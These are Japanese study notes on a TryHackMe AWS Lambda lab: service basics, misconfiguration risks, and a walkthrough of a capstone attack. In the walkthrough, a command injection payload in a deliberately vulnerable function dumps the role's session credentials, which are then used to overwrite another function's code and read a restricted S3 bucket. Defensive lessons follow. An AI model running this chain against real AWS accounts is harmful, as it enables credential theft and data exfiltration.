# Lambda

https://tryhackme.com/room/awslambda

## 基本

- AWS は Lambda 関数が初めて呼び出されたときに実行環境をインスタンス化する。（コールドスタートと呼ばれる）
- 複数のリクエストが同時に到着した場合、AWS は実行環境の数をスケールアップする。
- 実行環境では一度に 1 つの呼び出しのみ実行する。
- 呼び出しが完了すると、その実行環境は後続のリクエストに再利用される（45 分～ 1 時間程度）
- 呼び出しの入力は「イベント」と呼ばれる
- 「コンテキスト」も渡される。Lambda 関数名、ログ情報、関数のタイムアウト、タイムアウトまでの残り時間などの詳細が含まれる。
- Lambda 関数は同期または非同期で呼び出すことができる。
- 関数によって STDOUT（出力）または STDERR（エラーメッセージ）に書き込まれたすべてのデータを CloudWatch Logs に記録する。
- デフォルトでは、AWS Lambda 関数には AWS 所有の IP アドレスの専用プールからパブリック IP アドレスが割り当てられる。ただし、 VPC 内で関数を呼び出す場合は、プライベート IP アドレスを指定することも可能。これは通常、Lambda 関数が RDS データベースなどの内部リソースやオンプレミスデータセンター内のリソースと通信する必要がある場合に必要となる。
- /tmp が、実行環境ファイルシステムの中で関数コードが書き込み可能な唯一の領域。
- Lambda レイヤー内のファイルは、Lambda ファイルシステムの/opt ディレクトリ下に表示される。

### コンポーネント

- ロール（AWS アカウント内のリソースを操作する権限）
- 環境変数（同じコード zip を複数の環境で使える）
- 呼び出しポリシー（誰が呼び出しを実行できるか）
- Lambda 関数 URL

```
https://<url-id>.lambda-url.<region>.on.aws

Lambdaは、 AWSアカウントIDを含む複数の要素に基づいてエンドポイントの<url-id>部分を生成する。このプロセスは決定論的であるため、誰でも<url-id>からアカウントIDを取得できる可能性がある。
```

### コード例

```python
import boto3
from botocore.exceptions import ClientError
import json
import os
import logging

# This code executes when the execution environment is created and sets up how the python logger will work
logger = logging.getLogger()
logger.setLevel(getattr(logging, os.getenv('LOG_LEVEL', default='INFO')))
logging.getLogger('botocore').setLevel(logging.WARNING)
logging.getLogger('boto3').setLevel(logging.WARNING)

# This code executes when the function is invoked
def lambda_handler(event, context):
 logger.debug("Received event: " + json.dumps(event, sort_keys=True))
 for key in os.environ.keys():
   logger.info(f"{key}={os.environ[key]}") os.environ[key]
 return(event)
```

## 誤った設定と攻撃ベクトル

- 安全でないコード。ほとんどの Lambda 関数は、ユーザーが生成したイベントに基づいて実行される。コードがユーザーからの入力を適切に検証しない場合、Lambda 関数が侵害される可能性がある。
- コードが機密データを STDOUT に書き込む場合。このデータは関数の CloudWatch ログに記録され、アカウントへの読み取りアクセス権を持つすべてのユーザーが閲覧できる。
- 実行ロールの権限が過度に許可されている場合。関数に必要以上の権限を付与すると、コードの脆弱性が発見された場合に攻撃者が及ぼす損害の爆発半径が拡大する。
- ロール権限は、環境変数 AWS_ACCESS_KEY_ID、AWS_SECRET_ACCESS_KEY、AWS_SESSION_TOKEN を介して利用できる。コードが外部の攻撃者にこれらの 3 つの環境変数へのアクセスを許可した場合、攻撃者は関数の権限を利用して、権限昇格やデータ窃取を実行できる可能性がある。
- ユーザー定義の環境変数は KMS で暗号化されているが、通常は関数内、API、AWS コンソールから簡単にアクセスできる。環境変数を使用して関数にシークレットを渡す場合、それらのシークレットはアカウントから簡単に持ち出される。
- リソースポリシーは通常、`lambda:invokeFunctionIAM`アクションと組み合わせて使用 ​​ されるが、代わりに`lambda:*`を使用した場合、プリンシパルが新しいコードをアップロードできるようになる。リソースポリシーがすべての AWS ユーザー（つまり、`Principal: *`）に許可されている場合、重大なセキュリティリスクが発生する。
- 攻撃者は、Lambda の同時実行性制限を利用してサービス拒否攻撃を仕掛け、セキュリティイベントへの対応に使用される Lambda 関数の性能を低下させる可能性がある。
- `lambda:GetFunction`API を呼び出すと、レスポンスの一部として、Lambda サービスの S3 バケットから Code の zip ファイルをダウンロードするための署名付き URL が返される。

```shell
# 関数の情報取得
aws lambda get-function --function-name arn:aws:lambda:us-east-1:019181489476:function:sample-lambda

# ポリシー取得
aws lambda get-policy --query Policy --output text --function-name arn:aws:lambda:us-east-1:830352411100:function:TryHackMeLambdaRoom-sample-function
```

## ケーススタディ

- ターゲットアカウントの ReadOnlyAccess の AWS 認証情報を持っている。
- VPC エンドポイントポリシーで保護された S3 バケットに保存された暗号ウォレットを入手する。

### バケット

```shell
# 全てのs3バケットを列挙する
aws s3 ls

# バケット内のファイルを列挙する
aws s3 ls s3://mauhur-coins-XXXXXXXXXXXX

# コピー（失敗する）
aws s3 cp s3://mauhur-coins-XXXXXXXXXXXX/password.txt .

# バケットポリシーの確認
aws s3api get-bucket-policy --bucket mauhur-coins-XXXXXXXXXXXX --query Policy --output text | jq .
```

バケットポリシー

- PutObject を除く全てのオブジェクト操作は、特定の VPC エンドポイント以外からできない設定になっている。

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "Statement1",
      "Effect": "Deny",
      "Principal": "*",
      "NotAction": "s3:PutObject",
      "Resource": "arn:aws:s3:::mauhur-coins-830352411100/*",
      "Condition": {
        "StringNotEquals": {
          "aws:SourceVpce": "vpce-046d2848f831e4f70"
        }
      }
    }
  ]
}
```

### VPC エンドポイント

```shell
# VPCエンドポイントの表示
aws ec2 describe-vpc-endpoints
```

```json
{
  "VpcEndpoints": [
    {
      "VpcEndpointId": "vpce-046d2848f831e4f70",
      "VpcEndpointType": "Gateway",
      "VpcId": "vpc-0da49cc027ad73de4",
      "ServiceName": "com.amazonaws.us-east-1.s3",
      "State": "available",
      "PolicyDocument": "{\"Version\":\"2012-10-17\",\"Statement\":[{\"Effect\":\"Allow\",\"Principal\":\"*\",\"Action\":\"*\",\"Resource\":\"*\"}]}",
      "RouteTableIds": ["rtb-029ce2ca208d149b8"],
      "SubnetIds": [],
      "Groups": [],
      "PrivateDnsEnabled": false,
      "RequesterManaged": false,
      "NetworkInterfaceIds": [],
      "DnsEntries": [],
      "CreationTimestamp": "2025-05-13T00:44:50+00:00",
      "Tags": [],
      "OwnerId": "830352411100"
    }
  ]
}
```

```shell
# VPCの表示
aws ec2 describe-vpcs
```

```json
{
  "Vpcs": [
    {
      "OwnerId": "830352411100",
      "InstanceTenancy": "default",
      "CidrBlockAssociationSet": [
        {
          "AssociationId": "vpc-cidr-assoc-0d0b06e247063fc15",
          "CidrBlock": "10.100.0.0/21",
          "CidrBlockState": {
            "State": "associated"
          }
        }
      ],
      "IsDefault": false,
      "Tags": [
        {
          "Key": "aws:cloudformation:logical-id",
          "Value": "VPC"
        },
        {
          "Key": "Name",
          "Value": "Mauhur's VPC - Do not Use"
        },
        {
          "Key": "aws:cloudformation:stack-name",
          "Value": "StackSet-lambda-capstone-9270d06e-a742-4e36-828a-18e0a8a891df"
        },
        {
          "Key": "aws:cloudformation:stack-id",
          "Value": "arn:aws:cloudformation:us-east-1:830352411100:stack/StackSet-lambda-capstone-9270d06e-a742-4e36-828a-18e0a8a891df/6f3779d0-2f93-11f0-bb96-0affc4789135"
        }
      ],
      "BlockPublicAccessStates": {
        "InternetGatewayBlockMode": "off"
      },
      "VpcId": "vpc-0da49cc027ad73de4",
      "State": "available",
      "CidrBlock": "10.100.0.0/21",
      "DhcpOptionsId": "dopt-0906f8dacf9edcaf7"
    }
  ]
}
```

バケットにアクセスするには、この VPC にアクセスする必要がある。

### Lambda

```shell
# Lambda関数の列挙
aws lambda list-functions
```

```json
{
  "Functions": [
    {
      "FunctionName": "download-images",
      "FunctionArn": "arn:aws:lambda:us-east-1:830352411100:function:download-images",
      "Runtime": "python3.13",
      "Role": "arn:aws:iam::830352411100:role/VPCLambda-AmazonS3FullAccess",
      "Handler": "index.lambda_handler",
      "CodeSize": 539,
      "Description": "Retrieves images from the Mordor Travel Agency",
      "Timeout": 3,
      "MemorySize": 128,
      "LastModified": "2025-05-13T00:45:00.199+0000",
      "CodeSha256": "0FZgE01PBPeOQg0SdP1ly+EbP2YOxSN3+5JZaBDVE1I=",
      "Version": "$LATEST",
      "VpcConfig": {
        "SubnetIds": ["subnet-08241e2cc16cebd82"],
        "SecurityGroupIds": ["sg-03dd1690af48df1ca"],
        "VpcId": "vpc-0da49cc027ad73de4",
        "Ipv6AllowedForDualStack": false
      },
      "Environment": {
        "Variables": {
          "LOG_LEVEL": "INFO",
          "IMAGE_BUCKET": "mordor-pics-830352411100"
        }
      },
      "TracingConfig": {
        "Mode": "PassThrough"
      },
      "RevisionId": "0b230991-da26-4e7e-9772-b64e5d683bf3",
      "PackageType": "Zip",
      "Architectures": ["x86_64"],
      "EphemeralStorage": {
        "Size": 512
      },
      "SnapStart": {
        "ApplyOn": "None",
        "OptimizationStatus": "Off"
      },
      "LoggingConfig": {
        "LogFormat": "Text",
        "LogGroup": "/aws/lambda/download-images"
      }
    },
    {
      "FunctionName": "list-images",
      "FunctionArn": "arn:aws:lambda:us-east-1:830352411100:function:list-images",
      "Runtime": "python3.13",
      "Role": "arn:aws:iam::830352411100:role/MordorTravel-ReadImageBucket",
      "Handler": "index.lambda_handler",
      "CodeSize": 449,
      "Description": "Lists all files from the Mordor Travel Agency",
      "Timeout": 3,
      "MemorySize": 128,
      "LastModified": "2025-05-13T00:45:12.388+0000",
      "CodeSha256": "FZJ0W1eJwHIMvlFzVx64hCfRs3zgdVYKBjEmMNaWW24=",
      "Version": "$LATEST",
      "Environment": {
        "Variables": {
          "LOG_LEVEL": "INFO",
          "IMAGE_BUCKET": "mordor-pics-830352411100"
        }
      },
      "TracingConfig": {
        "Mode": "PassThrough"
      },
      "RevisionId": "ed8cb971-25a5-472e-9644-2a245668ba40",
      "PackageType": "Zip",
      "Architectures": ["x86_64"],
      "EphemeralStorage": {
        "Size": 512
      },
      "SnapStart": {
        "ApplyOn": "None",
        "OptimizationStatus": "Off"
      },
      "LoggingConfig": {
        "LogFormat": "Text",
        "LogGroup": "/aws/lambda/list-images"
      }
    }
  ]
}
```

- ダウンロードする機能と、リスト表示する機能と推測できる。
- download-images は目的の VPC 内、list-images は VPC 外にある。

```sh
# 関数にアタッチされているポリシーの取得
FUNCTIONS="list-images download-images"

for f in $FUNCTIONS ; do
    ROLE=`aws lambda get-function --function-name $f --query Configuration.Role --output text | awk -F\/ '{print $NF}'`
    echo "$f has $ROLE with these managed policies:"
    aws iam list-attached-role-policies --role-name $ROLE
    for p in `aws iam list-role-policies  --role-name $ROLE --query PolicyNames --output text` ; do
        echo "$ROLE for $f has inline policy $p:"
        aws iam get-role-policy --role-name $ROLE --policy-name $p
    done
done
```

- list-images に AWSLambda_FullAccess が付いている。（他の Lambda 機能も変更できる）
- download-images に VPCLambda-AmazonS3FullAccess が付いている。

list-images を使用して、download-images のコードを変更することが目標になる。

```json
list-images has MordorTravel-ReadImageBucket with these managed policies:
{
    "AttachedPolicies": [
        {
            "PolicyName": "AWSLambda_FullAccess",
            "PolicyArn": "arn:aws:iam::aws:policy/AWSLambda_FullAccess"
        }
    ]
}

download-images has VPCLambda-AmazonS3FullAccess with these managed policies:
{
    "AttachedPolicies": [
        {
            "PolicyName": "AWSLambdaVPCAccessExecutionRole",
            "PolicyArn": "arn:aws:iam::aws:policy/service-role/AWSLambdaVPCAccessExecutionRole"
        },
        {
            "PolicyName": "AWSLambdaBasicExecutionRole",
            "PolicyArn": "arn:aws:iam::aws:policy/service-role/AWSLambdaBasicExecutionRole"
        },
        {
            "PolicyName": "AmazonS3FullAccess",
            "PolicyArn": "arn:aws:iam::aws:policy/AmazonS3FullAccess"
        }
    ]
}
```

### コードの取得、変更

```sh
# コードバンドルを取得
FUNCTIONS="list-images download-images"
for f in $FUNCTIONS ; do
    URL=`aws lambda get-function --function-name $f --query Code.Location --output text`
    curl -s $URL -o $f.zip
    mkdir $f
    unzip $f.zip -d $f
done
```

```sh
root@ip-10-10-202-73:~# bash ./getcode.sh
Archive:  list-images.zip
  inflating: list-images/index.py
Archive:  download-images.zip
  inflating: download-images/index.py
```

list-images/index.py

```python
def lambda_handler(event, context):

  # Uglúk gave me this command to run.
  command = f"aws s3 ls s3://{os.environ['IMAGE_BUCKET']}/{event['prefix']}"
  files = os.popen(command).read()
  return(files)
```

- コマンドインジェクションの脆弱性があることに注意

download-images/index.py

```python
def lambda_handler(event, context):

  s3_client = boto3.client('s3')

  try:
      response = s3_client.get_object(
          Bucket=os.environ['IMAGE_BUCKET'],
          Key=event['object_key']
      )
      contents = str(response['Body'].read().decode("utf-8"))
      logger.info(f"File Contents are: {contents}")
  except ClientError as e:
      logger.error(f"ClientError getting s3://{os.environ['IMAGE_BUCKET']}/{event['object_key']}: {e}")

  return(contents)
```

```python
# Bucket=os.environ['IMAGE_BUCKET'] の行を、こう変える
Bucket='mauhur-coins-XXXXXXXX',
```

```shell
# 変更して圧縮
zip -r ../compromised.zip index.py
```

### 攻撃

payload.json

```json
{
  "prefix": " ; env "
}
```

コマンドインジェクションで実行した、env コマンドの出力がファイル保存される。

```sh
aws lambda invoke --function-name list-images --payload fileb://payload.json output.json
cat output.json | jq -r . | grep AWS
```

新しいセッション情報を使うため、以降は別のウィンドウで。

```sh
user@machine$ export AWS_SESSION_TOKEN=REDACTED
user@machine$ export AWS_SECRET_ACCESS_KEY=REDACTED
user@machine$ export AWS_ACCESS_KEY_ID=ASIAREDACTED

# 認証情報が設定されたことを確認
aws sts get-caller-identity
```

zip ファイルをアップロード

```shell
aws lambda update-function-code --region us-east-1 --function-name download-images --zip-file fileb://compromised.zip
```

payload2.json

```json
{ "object_key": "password.txt" }
```

```sh
aws lambda invoke --function-name download-images --payload fileb://payload2.json output2.json
```

### データ侵害された要因

#### 過度に寛容なロール

- download-images は、スコープを適切なバケットのみに設定すべきだった。
- list-images に Lambda 管理ポリシーを付けるべきではなかった。

#### サニタイズされていない入力

- list-images がコマンドインジェクションを許した点。入力を検証しなければならない。

#### VPC 内の Lambda

- Lambda 関数は IAM 権限によって呼び出され、管理されるため、プライベート企業ネットワークへの不要なアクセスを許可すると、攻撃者がクラウドからネットワークへと横方向に移動を許す。

#### ReadOnlyAccess 認証情報の漏洩

- ReadOnlyAccess は非常に強力なマネージドポリシーであり、軽々しく使用すべきではない。

#### アカウントの分離

- AWS では、アプリケーションやビジネス機能ごとに新しい AWS アカウントを作成することを推奨している。
- Mordor Travel の画像アプリケーションと Mauhur の暗号通貨ウォレットは、同じ AWS アカウントに共存させるべきではなかった。
